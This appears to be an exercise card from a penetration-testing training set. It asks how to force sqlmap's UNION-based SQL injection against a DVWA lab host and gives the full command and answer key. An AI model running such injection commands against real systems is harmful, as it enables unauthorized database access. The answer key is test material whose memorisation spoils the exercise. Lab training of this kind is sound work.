# Q265 — Force UNION-Based Injection

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🟡 Medium |
| **Tools** | `sqlmap` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"Force sqlmap to use UNION-based technique with --technique=U. Also specify the number of columns with --union-cols."

---

## 🎯 Flag Format

```
technique=<type>; columns=<number>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" --technique=U --union-cols=2 --dbs --batch
```

**Answer:** `technique=union-based; columns=2`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q265"
